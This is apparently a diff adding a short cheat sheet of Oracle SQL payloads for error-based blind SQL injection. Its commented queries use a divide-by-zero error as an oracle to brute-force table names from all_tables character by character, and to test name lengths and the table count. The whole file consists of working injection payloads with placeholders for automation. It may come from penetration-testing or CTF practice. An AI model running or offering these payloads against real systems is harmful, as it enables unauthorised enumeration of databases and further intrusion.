@@ -1,0 +1,27 @@
+# For the nth row of all_tables, brute force the table name. Checks whether the first letter is equal to a. If true, no error, else error. 
+# Characters [a-z][A-Z][0-9]
+# ... ( TABLE_NAME, [INSERT],1 )='[INSERT]'...
+# ... where rnum = [INSERT]) ...
+
+SELECT CASE WHEN SUBSTR( TABLE_NAME, 1,1 )='a' THEN 'true' ELSE TO_CHAR(1/0) END FROM (select * from (
+select rownum rnum, owner, TABLE_NAME from all_tables
+) where rnum = 1) 
+
+# Find nth row from all_tables
+SELECT TABLE_NAME FROM (select * from (
+select rownum rnum, owner, TABLE_NAME from all_tables
+) where rnum = 1)
+
+# Find length of table name
+SELECT CASE WHEN LENGTH(TABLE_NAME)=4 THEN 'true' ELSE TO_CHAR(1/0) END FROM (select * from (
+select rownum rnum, owner, TABLE_NAME from all_tables
+) where rnum = 1)
+
+
+# Get Substring of table name
+SELECT SUBSTR(TABLE_NAME,1,2) FROM (select * from (
+select rownum rnum, owner, TABLE_NAME from all_tables
+) where rnum = 1)
+
+# Count all number of tables 
+select case when count(*)=73 then 'true' else to_char(1/0) end from all_tables
